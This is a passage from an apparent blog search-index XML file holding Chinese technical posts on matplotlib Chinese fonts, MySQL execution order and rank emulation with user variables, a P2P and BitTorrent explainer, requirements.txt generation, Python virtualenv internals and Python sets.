sans-serif我们还要找到axes.unicode_minus这一行，去掉最前面的注释，同时将值修改为False，解决坐标轴的负号显示不正常的问题：12-#axes.unicode_minus : True ## use unicode for the minus symbol+axes.unicode_minus : False ## use unicode for the minus symbol删除缓存我们先通过下面的代码找到matplotlib缓存目录：12import matplotlib as mplmpl.get_cachedir()1&apos;C:\\Users\\xxxx\\.matplotlib&apos;然后我们删除C:\Users\你的用户名\.matplotlib里面的所有文件：12345├─.matplotlib│ │ fontlist-v310.json│ │ fontList.json│ │ │ └─tex.cache重启Python使得配置生效，然后即可正常显示中文了。]]></content>
      <categories>
        <category>Python</category>
        <category>数据可视化</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>matplotlib</tag>
        <tag>数据可视化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL语句执行顺序]]></title>
    <url>%2Farchives%2F50fcee2f.html</url>
    <content type="text"><![CDATA[MySQL的语句一共分为12步，如下图所标注的那样，最先执行的总是FROM操作，最后执行的是LIMIT操作。其中每一个操作都会产生一张虚拟的表，这个虚拟的表作为一个处理的输入，只是这些虚拟的表对用户来说是透明的，但是只有最后一个虚拟的表才会被作为结果返回。123456789101112(8) SELECT (9) DISTINCT &lt;select_list&gt;(1) FROM &lt;left_table&gt;(3) &lt;join_type&gt; JOIN &lt;right_table&gt;(2) ON &lt;join_condition&gt;(4) WHERE &lt;where_condition&gt;(5) GROUP BY &lt;group_by_list&gt;(6) WITH &#123;CUBE|ROLLUP&#125;(7) HAVING &lt;having_condition&gt;(10) UNION ALL...(11) ORDER BY &lt;order_by_list&gt;(12) LIMIT &lt;limit_number&gt;下面我们来具体分析一下查询处理的每一个阶段：FORM: 对FROM的左边的表和右边的表计算笛卡尔积。产生虚表VT1。ON: 对虚表VT1进行ON筛选，只有那些符合&lt;join-condition&gt;的行才会被记录在虚表VT2中。JOIN： 如果指定了OUTER JOIN（比如left join、 right join），那么保留表中未匹配的行就会作为外部行添加到虚拟表VT2中，产生虚拟表VT3, 如果from子句中包含两个以上的表的话，那么就会对上一个join连接产生的结果VT3和下一个表重复执行步骤1~3这三个步骤，一直到处理完所有的表为止。WHERE：对虚拟表VT3进行WHERE条件过滤。只有符合&lt;where-condition&gt;的记录才会被插入到虚拟表VT4中。GROUP BY: 根据group by子句中的列，对VT4中的记录进行分组操作，产生VT5。CUBE | ROLLUP: 对表VT5进行cube或者rollup操作，产生表VT6。HAVING： 对虚拟表VT6应用having过滤，只有符合&lt;having-condition&gt;的记录才会被 插入到虚拟表VT7中。SELECT： 执行select操作，选择指定的列，插入到虚拟表VT8中。DISTINCT：对VT8中的记录进行去重。产生虚拟表VT9。UNION ALL：对VT9中的记录和其他表的返回的记录进行组合得到虚拟表VT10。ORDER BY: 将虚拟表VT10中的记录按照&lt;order_by_list&gt;进行排序操作，产生虚拟表VT11。LIMIT：取出指定行的记录，产生虚拟表VT12, 并将结果返回。参考MySQL的语句执行顺序]]></content>
      <categories>
        <category>数据库</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL实现Rank高级排名函数]]></title>
    <url>%2Farchives%2F69151617.html</url>
    <content type="text"><![CDATA[MySQL中没有Rank排名函数，当我们需要查询排名时，只能使用MySQL数据库中的基本查询语句来查询普通排名。尽管如此，可不要小瞧基础而简单的查询语句，我们可以利用其来达到Rank函数一样的高级排名效果。在这里我用一个简单例子来实现排名的查询：首先我们先创建一个我们需要进行高级排名查询的players表，123456789101112131415161718192021CREATE TABLE `players` ( `pid` int(2) NOT NULL AUTO_INCREMENT, `name` varchar(50) NOT NULL, `age` int(2) NOT NULL, PRIMARY KEY (`pid`), UNIQUE KEY `name` (`name`)) ENGINE=InnoDB DEFAULT CHARSET=latin1;INSERT INTO `players` (`pid`, `name`, `age`) VALUES(1, 'Samual', 25),(2, 'Vino', 20),(3, 'John', 20),(4, 'Andy', 22),(5, 'Brian', 21),(6, 'Dew', 24),(7, 'Kris', 25),(8, 'William', 26),(9, 'George', 23),(10, 'Peter', 19),(11, 'Tom', 20),(12, 'Andre', 20);1、在MySQL中实现Rank普通排名函数在这里，我们希望获得一个排名字段的列，以及age的升序排列。所以我们的查询语句将是：123SELECT pid, name, age, @curRank := @curRank + 1 AS rankFROM players p, (SELECT @curRank := 0) qORDER BY age1234567891011121314| PID | NAME | AGE | RANK ||-----|---------|-----|------|| 10 | Peter | 19 | 1 || 12 | Andre | 20 | 2 || 2 | Vino | 20 | 3 || 3 | John | 20 | 4 || 11 | Tom | 20 | 5 || 5 | Brian | 21 | 6 || 4 | Andy | 22 | 7 || 9 | George | 23 | 8 || 6 | Dew | 24 | 9 || 7 | Kris | 25 | 10 || 1 | Samual | 25 | 11 || 8 | William | 26 | 12 |要在mysql中声明一个变量，你必须在变量名之前使用@符号。FROM子句中的(@curRank := 0)部分允许我们进行变量初始化，而不需要单独的SET命令。当然，也可以使用SET，但它会处理两个查询：1234SET @curRank := 0;SELECT pid, name, age, @curRank := @curRank + 1 AS rankFROM playersORDER BY age2、在MySQL中实现Rank普通并列排名函数现在，如果我们希望为并列数据的行赋予相同的排名，则意味着那些在排名比较列中具有相同值的行应在MySQL中计算排名时保持相同的排名(例如在我们的例子中的age)。为此，我们使用了一个额外的变量。1234567SELECT pid, name, age, CASE WHEN @prevRank = age THEN @curRank WHEN @prevRank := age THEN @curRank := @curRank + 1END AS rankFROM players p, (SELECT @curRank :=0, @prevRank := NULL) rORDER BY age1234567891011121314| PID | NAME | AGE | RANK ||-----|---------|-----|------|| 10 | Peter | 19 | 1 || 12 | Andre | 20 | 2 || 2 | Vino | 20 | 2 || 3 | John | 20 | 2 || 11 | Tom | 20 | 2 || 5 | Brian | 21 | 3 || 4 | Andy | 22 | 4 || 9 | George | 23 | 5 || 6 | Dew | 24 | 6 || 7 | Kris | 25 | 7 || 1 | Samual | 25 | 7 || 8 | William | 26 | 8 |如上所示，具有相同数据和排行的两行或多行，它们都会获得相同的排名。玩家Andre, Vino, John 和Tom都有相同的age，所以他们排名并列第二。下一个最高age的玩家(Brian)排名第3。这个查询相当于MSSQL和ORACLE 中的DENSE_RANK()函数。注意：CASE WHEN @prevRank := age THEN @curRank := @curRank + 1这里的赋值语句@prevRank := age主要作用是赋值，赋值语句也为true，所以也可以用来做逻辑判断。3、在MySQL中实现Rank高级并列排名函数我们这里要补全因为并列而导致的排名空位。举例来说：Andre，Vino，John和Tom都有相同的age，所以他们排名并列第二。下一个最高年龄的球员(Brian)排名第6，而不是第3，因为有4个人并列排名在第2。12345678SELECT pid, name, age, rank FROM(SELECT pid, name, age,@curRank := IF(@prevRank = age, @curRank, @incRank) AS rank, @incRank := @incRank + 1, @prevRank := ageFROM players p, (SELECT @curRank :=0, @prevRank := NULL, @incRank := 1) r ORDER BY age) s1234567891011121314| PID | NAME | AGE | RANK ||-----|---------|-----|------|| 10 | Peter | 19 | 1 || 12 | Andre | 20 | 2 || 2 | Vino | 20 | 2 || 3 | John | 20 | 2 || 11 | Tom | 20 | 2 || 5 | Brian | 21 | 6 || 4 | Andy | 22 | 7 || 9 | George | 23 | 8 || 6 | Dew | 24 | 9 || 7 | Kris | 25 | 10 || 1 | Samual | 25 | 10 || 8 | William | 26 | 12 |这是一个查询中的子查询。我们使用三个变量(@incRank，@prevRank，@curRank)来计算关系的情况下，在查询结果中我们已经补全了因为并列而导致的排名空位。我们已经封闭子查询到查询。这个查询相当于MSSQL和ORACLE中的RANK()函数。作者：风澈vio链接：https://www.jianshu.com/p/bb1b72a1623e]]></content>
      <categories>
        <category>数据库</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL声明变量以及赋值]]></title>
    <url>%2Farchives%2F314d9759.html</url>
    <content type="text"><![CDATA[MySQL 的变量分为四种： 局部变量 、 用户变量 、 会话变量 和 全局变量 ，其中局部变量只存在于函数和存储过程，这里不多了解。其中 会话变量 和 全局变量 在 MySQL 中统称为 系统变量 。本文简单讲一下用户变量。用户变量SET 方式123# 两种方式都可以SET @variable = exprSET @variable := exprSELECT 方式12# 必须 :=SELECT @variable := expr示例我们来一个简单的示例，实现一个序号的功能，表和数据如下：12345678CREATE TABLE employee ( id int primary key, salary int not null);INSERT INTO employee VALUES(1, 100);INSERT INTO employee VALUES(2, 200);INSERT INTO employee VALUES(3, 300);根据之前学习的内容，我们可以很快的写出如下 SQL：12SELECT salary, (@rowno := @rowno + 1) AS 'rowno'FROM employee, (SELECT @rowno := 0) r;1234567+--------+-------+| salary | rowno |+--------+-------+| 100 | 1 || 200 | 2 || 300 | 3 |+--------+-------+没有问题，一切都和预期一样，然后我们加一个 WHERE 条件试试：123SELECT salary, (@rowno := @rowno + 1) AS 'rowno'FROM employee, (SELECT @rowno := 0) rWHERE @rowno = 0;12345+--------+-------+| salary | rowno |+--------+-------+| 100 | 1 |+--------+-------+理论上来说，这是不应该返回数据的，但是它还就是返回了一条数据，就是 id 为 1 的那条。为什么呢？ WHERE 条件使用的 @rowno 一直都是同一个值 0 ，它不会因为 SELECT 上修改了就实时响应 。要实现 WHERE 的功能需要改写成如下：123456SELECT salary, rownoFROM ( SELECT salary, (@rowno := @rowno + 1) AS 'rowno' FROM employee, (SELECT @rowno := 0) r) mWHERE rowno = 2;12345+--------+-------+| salary | rowno |+--------+-------+| 200 | 2 |+--------+-------+实际上在 SELECT 的 WHERE 、 GROUP BY 和 ORDER BY 中用户变量都不会按预期操作，它使用的是旧值，不会实时修改。本文转载于：MySQL 之变量]]></content>
      <categories>
        <category>数据库</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[P2P技术科普]]></title>
    <url>%2Farchives%2Fbe439524.html</url>
    <content type="text"><![CDATA[迅雷，msn，skype，pplive, ppstream, BT……铺天盖地的P2P应用已然一定程度上改变了我们上网的习惯，方式以及质量。如果你想了解P2P技术，又懒得找，懒得看那些繁琐，模棱两可又及其抽象的中文资料，这里应该是一个你想来的地方。 我的目的是用比较俗的语言来对P2P技术做一个系统的介绍。这里，我会尽量避开不必要的术语，只告诉并解释你需要知道的。当然我不是什么专家，不过请你相信我回尽量保证我所提供信息的准确性和严谨性。我们没有任何商业目的，您的每一次点击都将对我国的慈善事业做出一份贡献。在此谨代表站长kakarott先生向诸位表示感谢。一、P2P基本原理在P2P技术之前，网络中的所有人大多都是通过一种叫做“客户端/服务器”的模式被组织在一起。一个服务器向很多客户提供服务。举个例子吧： kaka有一台机子，里面存有全套的央视春晚，他想把他的挚爱分享给所有人。于是不论是通过广告还是别的什么方式，很多人知道了kaka有这个资源的消息。通过网络，他们就可以向kaka建立连接并从他的机子上下载。这样就形成了一个以kaka为中心的小型网络。这当中，kaka是服务器，其他人都是客户端。如图一：这样的模式中，对服务器的性能及相应带宽要求比较高，如果有成千上万的人都想下春晚，kaka的海淀在线肯定就操蛋了。当然一般的公司不会用一个家用电脑做服务器。假设有存在一个特别强大的服务器，以及足够的带宽。我们来看看这种模式天生的一些弱点：服务器扮演的角色太重了，网络的一切都指着他。假如kaka不小心把电脑从6楼扔下去，整个网络就都瘫痪了。请注意，想要把一个服务器弄失灵的方法太多了，所以使用这中模式的风险是比较大的。网络的资源利用率低下。所有客户都只能从服务器那获得资源，因为他们之间不认识，甚至不知道相互的存在。然而，现实中，可能每个人都有自己独门的资源，比如日天有无数游戏，威哥有无数动漫电影…….总之，整个网络的资源可能是服务器的无数倍。但是苦无客户端之间没有交流的渠道，所以资源无法互通。关于完美服务器的假设，基本不成立。P2P技术就是要解决上述的问题已达到如下的效果： 所有人的资源都可以被别人找到并使用。没有哪个人特别重要，人人平等（peer-to-peer就是这个意思），任何一个人失灵都不会导致网络的死亡。这里以Gnutella为例，对P2P基本原理进行介绍。 Gnutella是一种典型的P2P网络，很具代表性，以其为基础的软件有Limewire。这种网络里，没有服务器。用户之间任意连接，如图二左所示：Kaka认识 ‘日天’‘curt’‘威’， 日天认识‘小胖’，威认识‘候泡’，Curt 认识 ‘路’。当然真正的网络有至少有成百上千个用户，这里只是展示一个小的局部。这个网络如何工作呢？比如kaka想要找一首叫‘走进新时代’的歌。一个基本交易要经过如下几步：kaka给他的邻居们每人发一个请求消息，‘你们丫谁有走进新时代？’日天，威，curt吐血，‘谁tm听这歌啊，我没有’。于是把kaka的消息转发给他们的邻居：日天发给小胖，威发给候泡，curt发给路总。当kaka邻居的邻居们收到这个消息后，同样，先看看自己有没有。比如，候泡有这个歌，他就可以给kaka发个消息：‘爷这有，来下吧’卡卡于是可以直接去候泡那下载。很多人说在p2p里面，所有人即是服务器又是客户端。应该这样理解，比如，kaka在上例中就是个客户端。 但当有人要想要春晚的时候，只要那人的请求消息能被转到kaka这，kaka就可以成为一个服务器。最后要说的是P2P的现状以及应用。目前P2P与传统的‘客户端/服务器’模式可以说分庭抗礼，互为补充。那么为什么没能取而代之呢？因为，P2P也有自身的弱点，其中包括：占带宽（50%以上的网络带宽都是P2P占用的，搜索方法不灵）安全（不具体解释了，太专业了，总之和加密那些东西有关）诚信（没有中央控制，你传个毛片也可以告诉你是新闻联播）自私（我什么都不付出，有也说没有）知识产权保护（在中国相当于盗版的集散地）等等。 至于这些问题的对策以及其不足，以后会做专题介绍。P2P的应用不少但大都停留在比较低端的服务，比如文件共享，msn，在线视频这一类。实际上作为一种新的模式，其生命力应该不止如此。二、非结构化P2P及其搜索方法上集回顾，传统的‘客户端/服务器’模式有一些问题，比如，单一故障点，低资源利用率，高带宽要求。我说P2P客服了这些问题，因为没有中央服务器了。这里，我要强调一下，并不是说只要有中央的东西就是失败，只要这个中央的东西不是那个实际掌握资源的人就可以接受。下面，简要介绍一下P2P技术的发展。第一代、Napster这一代的p2p只是把资源从服务器上拿掉了。中央服务器上只有一个目录。这个目录记录着哪个用户有哪些资源。要建立这样的一个目录，要求网络中的每个人都要告诉这个服务器：他有什么资源。Kaka发一个资源请求向中央服务器。这个服务器然后检索目录，并告诉Kaka，日天有他要的东西。Kaka直接去找日天下东西。这样做，解决了高带宽需求（服务器只需要转发一些消息，而不用真格的提供资源），低资源利用率的问题（网络里谁都可以发挥作用了）。但是，他仍然面临严重的‘单一故障点’风险。同时，napster的出现严重挑战了知识产权法，并最终导致其在2001年被勒令关闭。第二代、非结构化P2PNapster帝国的坍塌，导致了江湖上群雄并起，老的规矩也就法不责众了，其中Gnutella等非结构的P2P脱颖而出。非结构化说白了就是，用户之间瞎连，没有规定谁必须和谁有连接，基本随机。其基本搜索方法是地毯式的，如果这样的搜索能够遍及整个网络。那么，只要资源存在就一定能一网打尽。但是上天要求每一个用户都要给自己资源请求加一个限制，于是每个资源请求都只能走几步就必须停了，即使什么都还没找到。因为地毯式的搜索要消耗大量的网络资源，比如，平均一个人有4个邻居，如果资源请求的限制为5. 那么一共需要4+42+43+44+45=1364个信息，每个信息多大呢？大概几k到几十k，也就是说一个信息就至少几m。一个人一个信息就这么大了，想想一个大网络，每人十几个邻居，限制提高到7或8. 这就是为什么中国很多地方，尤其是网吧限制p2p. 因为他们可怜的带宽都被p2p的请求信息占用了。当然，p2p的设计者们都看到了问题，于是提出了很多新的搜索方法。这些方法可以分成两种：根据以前的搜索信息对以后的搜索进行预测；瞎找，碰运气。根据经验的搜索准确率可能会高一点，但是这种方法要求每个用户都要建一些表来记录以前的数据，而且每次发送或接到请求都要经过一系列的计算才能决定发给哪个邻居。而且程序上难以实现，更重要的是平均准确率并不比瞎找好很多。这里就不多做介绍了。瞎B找的，还基本上以地毯式为基础。我介绍两种最常见的：K-walkers: 第一个人先把消息发给k个邻居，具体多少都自己定。 然后从第一轮邻居开始都只把消息转发给他们的一个邻居。水纹式（涟漪式）：先定一个限制。第一个人先发给第一层的邻居。如果第一层不灵，他们再发给他们的邻居。一旦找到资源就不再继续了。这样的话最坏的情况就是原始的地毯式。好点的情况就是，消息没到限制就找到了相应的资源，就停了。这种非结构的p2p的优点在于，操作简单，完全不需要中央控制，所以又称为‘存（纯）p2p’。其缺点同样明显，要么牺牲搜索成功率，要么牺牲带宽占有量。于是又有人提出了结构化的P2P。数学的东西我就不说了，基本的思想就是：每个用户，资源都得有个名字。有一种数学加密方法，对这些名字加密。且保证如果名字不同，那么得到的结果就不同。如一资源和一用户加密后结果接近，就把该资源的地址放到相应的用户身上。举个例子：有三个人，日天，kaka，威哥。三个资源：“一剪梅.mp3”,“八荣八耻歌歌词.txt”,“xxx.avi”，对这六个东西加密后分别得到： 100，200，3000， 3002， 233，98，‘xxx.avi’的下载地址就会被分配到‘日天’的机子上，于是当你想搜索“xxx.avi”，你的消息就会通过某种方法被传到到日天那。这样，结构化的P2P就可以保证，只要网络里有相应的资源，就一定能找到。但是由于其程序实现的难度，加之维护网络所需的投入太大，并不被经常使用。尽管他有很漂亮的数据。当然还有第三代的，以后再做专题。三、BT工作原理简介2002年左右，程小胖告诉我有一种软件可以下片，人越多越快。很神奇。请注意，并不是所有的P2P技术都能做到这点，其他的P2P基本上只是提高网络资源的利用率，但是，网络中的每一单买卖都仍然采用，1对1的客户端服务器模式。回顾一下之前讲过的P2P，去掉技术细节，做一单买卖可以这样描述：有人向网络发一个资源请求（请求者）。有很多种搜索方法可供选择。当一个有该的资源的人（提供者）收到这个的请求，他会设法通知请求者：他那有其想要的东西。于是请求者去找提供者下载。这样做的一个缺点就是，比如，我选择了一个比较矬的提供者，而那人的带宽只有30k，然而网络中还有很多潜在提供者，可能有的人能达到30m。但是由于我在选择时只无法对对方的带宽做出判断而无福消受。这样做还有一个致命的漏洞！比如，我收到一个关于“海贼王”的请求，而且我有全套。按理说我应该通知请求者，让他来我这下。但是，让他来我这里下东西，对我来说，除了占我带宽，增加我中毒的风险，没有任何的好处。那我凭什么主动邀请他来？？我何不装ytd，对该请求视而不见？非常不幸的是，跟我有相同想法的孙子在一般p2p网络里面占了大多数，甚至绝大多数。这就是搭便车问题（free riding）。所幸还是有一些大侠的，无偿的提供着大量资源，他们的存在使得那些一般的P2P得以侥幸存活。其实，如果仅仅依赖活雷锋们，P2P就失去了其人人平等的意义。大侠们回复了网络中绝大多数的请求，于是人人都愿意与这些人建立连接，因为这样能更快的找到资源。于是这些大侠们就成了变得越来越红，网络的拓扑结构（我装b了，这个词没法解释，但是我实在找不出别的词了，别在意，看下图。）将会发生变化。这样的变化很不好，因为P2P又逐渐变成了客户端/服务器模式了。于是，不论是学术界还是产业界都意识到，如果没有一种鼓励机制来刺激提供者，P2P将失去其天生的魅力。在众多解决方案中BT脱颖而出，迅速发展了起来。BT是简称，在国外可能会产生歧义，如British Telecommunications等等。所以大家尽量还是用全称，尤其是和外国人说的时候Bit-Torrent。有人说BT是第三代的P2P，我认为这是因为他把P2P的理念更加深入的实现了。在BitTorrent当中，所有的资源都被切成很小的等份（碎片）。这里，你不需要知道怎么切，只需要知道有一种技术可以把一个文件切成很多小等份，还能把这些等份再重新的组装。在这个技术的支持下，bittorrent 中所有有相同请求的用户可以相互传资源的碎片。而且谁传的多，谁就将获得更多。具体技术如下：首先，有同样资源请求的人怎么能相互认识呢？bittorrent中每一个资源都对应有一个叫tracker的服务器。只要你对一个资源有意思，你就必须先联系这个资源相应的tracker。或者你想要共享一个资源你也必须联系tracker。这样的话，tracker就掌握着整个网络中谁想要这个资源以及谁有这个资源。当然，为了节约，一个tracker可以负责多种资源。那么，怎么找到tracker呢？大家可能听说过做种子，每个有完整资源的人都可以做种子，其实就是生成一个后缀是.torrent的文件。每一款bittorrent应用软件都会自动帮你生成，所以不用担心。你只要知道这个文件中包括两部分内容：1，tracker的地址。2，相关资源的一些属性，比如大小，名字等等。这个torrent文件一般都可以发布在网上，比如某某人的博客，或者论坛上。于是，大家可以从网上找到torrent文件，并从中知道tracker在哪。再通过联系tracker得到一个名单，其中包括一部分正在下载或有完整资源的用户。这时候，你就可以与这些人建立链接，并分别从他们身上要不同的碎片。当然要相同资源的人越多，你可以建立连接的人就越多，也就更可能早日得到所有碎片。还有一点很重要就是，bittorrent有自己的鼓励机制，就是说，你做的贡献大就会被鼓励，你不做贡献就会被惩罚。具体的操作是，每个人在下载的同时也上传。上传给谁呢？谁给我给的多，我就传给谁。而且我只传个前4名的（视具体软件具体分析，也可能是前8名或其他）。举个例子，比如kaka下载‘春晚’，先从某春晚发烧友论坛下载了一个叫“春晚全集.torrent”的文件。kaka可以联系文件中的tracker，并得知‘程胖，日天，威，候泡，鸣’有想关资源。于是kaka分别与这五个人建立连接。通过检测链接的流量，kaka可知，比如从程胖那下载速度可达200k/s, 日天100k/s, 威150k/s, 候泡70k/s,鸣2k/s。于是kaka在上传的时候就不给鸣上传，而只给前4名传。由于鸣的上传只有2k/s，所以不太可能有人给他传，所以时间一长他可能会意识到，可能自己给的太少了，于是把上传带宽增加到了500k/s。kaka突然意识到，从鸣那里可以得到很好的速度，于是停止给候泡（70k/s）传转而给鸣传。（总给那些速度最好的人上传是为了能留住他们，当然，只有你传的足够多才能留得住人家）。bittorrent大概的工作原理就是这样了，还有些细节这里不多说了。我个人认为Bittorrent的设计还是很不错的，但是其只适用于文件共享，或视频共享。然而网络中的资源又何止电影音乐？？绝大多数的资源是不可分的，bittorrent的局限性还是相当大！ 另一点可悲的是，大多数宽带用户是ADSL，也就是说他们的下载上传的带宽上限差别很大，比如，下载最大2m/s，上传却只有100k/s。这也限制了bittorrent的发挥。本文转载于：TLF基金-p2p科普]]></content>
      <categories>
        <category>计算机基础</category>
        <category>网络</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>P2P</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python项目生成requirements.txt]]></title>
    <url>%2Farchives%2F7d51c50b.html</url>
    <content type="text"><![CDATA[一起开发项目的时候总是要搭建环境和部署环境的，这个时候必须得有个Python第三方包的list，一般都叫做requirements.txt。本文介绍了两种生成requirements.txt的方法。一、使用pip freeze1pip freeze &gt; requirements.txt这种方式配合virtualenv才好使，否则把整个环境中的包都列出来了。下面是在虚拟环境中生成的requirements.txt文件内容：1cat requirements.txt123456789101112certifi==2019.3.9chardet==3.0.4fake-useragent==0.1.11idna==2.7lxml==4.2.5numpy==1.16.3pandas==0.22.0python-dateutil==2.8.0pytz==2019.1requests==2.20.0six==1.12.0urllib3==1.24.3二、使用 pipreqs这个工具通过对项目目录的扫描，自动发现使用了那些类库，自动生成依赖清单。此工具是基于imports，即你的项目引入了哪个包，此工具才会把引入的包写到requirements.txt中，要比pip freeze干净。这个工具的缺点是可能会有些偏差，需要检查并自己调整下。1pipreqs ./有可能会报如下错误：12345678910111213Traceback (most recent call last): File &quot;c:\program files\python36\lib\runpy.py&quot;, line 193, in _run_module_as_main &quot;__main__&quot;, mod_spec) File &quot;c:\program files\python36\lib\runpy.py&quot;, line 85, in _run_code exec(code, run_globals) File &quot;C:\Program Files\Python36\Scripts\pipreqs.exe\__main__.py&quot;, line 9, in &lt;module&gt; File &quot;c:\program files\python36\lib\site-packages\pipreqs\pipreqs.py&quot;, line 396, in main init(args) File &quot;c:\program files\python36\lib\site-packages\pipreqs\pipreqs.py&quot;, line 341, in init extra_ignore_dirs=extra_ignore_dirs) File &quot;c:\program files\python36\lib\site-packages\pipreqs\pipreqs.py&quot;, line 75, in get_all_imports contents = f.read()UnicodeDecodeError: &apos;gbk&apos; codec can&apos;t decode byte 0xaf in position 12: illegal multibyte sequence这是由于编码问题所导致的，加上encoding参数即可，如下：1pipreqs ./ --encoding=utf-8下面我看下生成的requirements.txt文件内容：1cat requirements.txt1234requests==2.20.0fake_useragent==0.1.11lxml==4.2.5pandas==0.22.0]]></content>
      <categories>
        <category>Python</category>
        <category>环境</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python虚拟环境实践]]></title>
    <url>%2Farchives%2F34b01e11.html</url>
    <content type="text"><![CDATA[开发每个Python项目时，都推荐创建对应的virtualenv来隔离开发。 这样可以不受系统Python软件包的影响，安装任意包的任意版本，并且最终能通过pip freeze &gt; requirements.txt获取依赖列表。当然，这个列表通常需要裁剪。一、安装virtualenv使用apt、yum等包管理器安装的版本老旧，推荐使用pip安装。1python3.6 -m pip install virtualenv二、准备virtualenv每个项目，都需要独立创建一个（或多个）虚拟环境，隔离开发。1virtualenv -p python3.6 venv-p是显式指定Python版本，避免使用默认的python。虚拟环境的常用名，可选择env、venv、.env、.venv。12345root@SS-DTA:/home/nbsprc# ls -alhtotal 12Kdrwxr-xr-x 3 root root 4.0K May 25 03:03 .drwxr-xr-x 9 root root 4.0K May 25 02:52 ..drwxr-xr-x 5 root root 4.0K May 25 03:03 venv三、激活virtualenv默认使用的是用户+系统环境，激活后才是虚拟环境。1source venv/bin/activate激活虚拟环境后，可以看到只有三个Python包。 这个环境可以随意使用，所有安装都会在./venv/下，不会影响系统环境。 干净的环境，也能帮助开发人员确认依赖。123456(venv) root@SS-DTA:/home/nbsprc# pip listPackage Version---------- -------pip 19.1.1setuptools 41.0.1wheel 0.33.4在这个虚拟环境中，python就是python3.6，而系统环境的python通常是python2。 在安装软件时，直接使用pip，即可安装到虚拟环境中。 而不像一般状态下，要么加sudo提权（[brew]或Windows环境下不用），要么安装时需要加–user，安装到用户目录下。四、退出virtualenv1deactivate退出后，回到用户+系统环境。五、虚拟环境的原理virtualenv是如何创建一个隔离的Python虚拟环境？这个环境有什么特点？这个环境的特点：Python版本固定。即使系统的Python升级了，虚拟环境中的仍然不受影响，保留开发状态。所有Python软件包，都只在这个环境生效。一旦退出，则回到用户+系统的默认环境中。这两个特点，由两个小手段实现。改变当前Shell的PATH。改变Python运行时的sys.path。改变PATH12root@SS-DTA:/home/nbsprc# echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin12(venv) root@SS-DTA:/home/nbsprc# echo $PATH/home/nbsprc/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin显然，这个activate，为当前PATH增加了/home/nbsprc/venv/bin这个位置在最前方，因此虚拟环境中的可执行文件拥有最高优先级。 而lib与include，仅仅是bin下面的可执行文件做相对路径运算来寻找的位置。 所以，改变了PATH，就改变了很多事。由于优先级最高，所以环境里的python、pip等，包括后来用pip安装的可执行文件，都使用的是venv下的。改变sys.path12345678910111213root@SS-DTA:/home/nbsprc# python3.6 -m sitesys.path = [ '/home/nbsprc', '/usr/lib/python36.zip', '/usr/lib/python3.6', '/usr/lib/python3.6/lib-dynload', '/usr/local/lib/python3.6/dist-packages', '/usr/local/lib/python3.6/dist-packages/setuptools-41.0.1-py3.6.egg', '/usr/lib/python3/dist-packages',]USER_BASE: '/root/.local' (exists)USER_SITE: '/root/.local/lib/python3.6/site-packages' (doesn't exist)ENABLE_USER_SITE: True123456789101112(venv) root@SS-DTA:/home/nbsprc# python -m sitesys.path = [ '/home/nbsprc', '/home/nbsprc/venv/lib/python36.zip', '/home/nbsprc/venv/lib/python3.6', '/home/nbsprc/venv/lib/python3.6/lib-dynload', '/usr/lib/python3.6', '/home/nbsprc/venv/lib/python3.6/site-packages',]USER_BASE: '/root/.local' (exists)USER_SITE: '/root/.local/lib/python3.6/site-packages' (doesn't exist)ENABLE_USER_SITE: False可见，sys.path发生了翻天覆地的变化。 除了当前路径/root和标准库/usr/local/lib/python3.6被保留以外，其它位置都换成了venv下的。 这就是为什么pip list看不见什么软件包的原因，也是环境隔离的最大秘密。参考：匿蟒-Python中的虚拟环境（Virtualenv）及其工作原理]]></content>
      <categories>
        <category>Python</category>
        <category>环境</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python集合用处]]></title>
    <url>%2Farchives%2F56cd6720.html</url>
    <content type="text"><![CDATA[集合的最大特点是：集合里边的元素是不可重复的并且集合内的元素还是无序的。一般情况下集合常用的两个场景是：去重（如：列表去重）关系测试（如：取交集、取并集、取差集等）一、去重1、比较麻烦的方法——利用列表方法就是遍历一个列表，对其中的每个数据判断在不在第二个列表里1234567list1=[1,2,3,4]list2=[3,4,5,6]list3=[]for i in list1: if i in list2: list3.append(i)print(list3)2、运用集合来去重123456list1 = [3,3,3,4,5,3]set1 = set(list1)print("list1去重后的set集合：",set1)# 再转化成一个列表new_list = [i for i in set1]print("list1去重后的list列表：",new_list)二、关系测试一些集合的最基本操作，如集合取交集、取并集、取差集、判断一个集合是不是另一个集合子集或者父集等。12set1 = set([1,2,3,4,5])set2 = set([3,4,5,6,7])1、交集1234# 方法1print(set1.intersection(set2))# 方法2print(set1 &amp; set2)2、并集1234# 方法1print(set1.union(set2))# 方法2print(set1 | set2)3、差集这里需要注意顺序。123456# set1 - set2print(set1.difference(set2))print(set1 - set2)# set2 - set1print(set2.difference(set1))print(set2 - set1)4、子集判断12# 判断set1是否是set2的子集print(set1.issubset(set2))5、父集判断12# 判断set1是否是set2的父集print(set1.issuperset(set2))]]></content>
      <categories>
        <category>Python</category>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python用list实现堆栈和队列]]></title>
    <url>%2Farchives%2F93f5c51f.html</url>
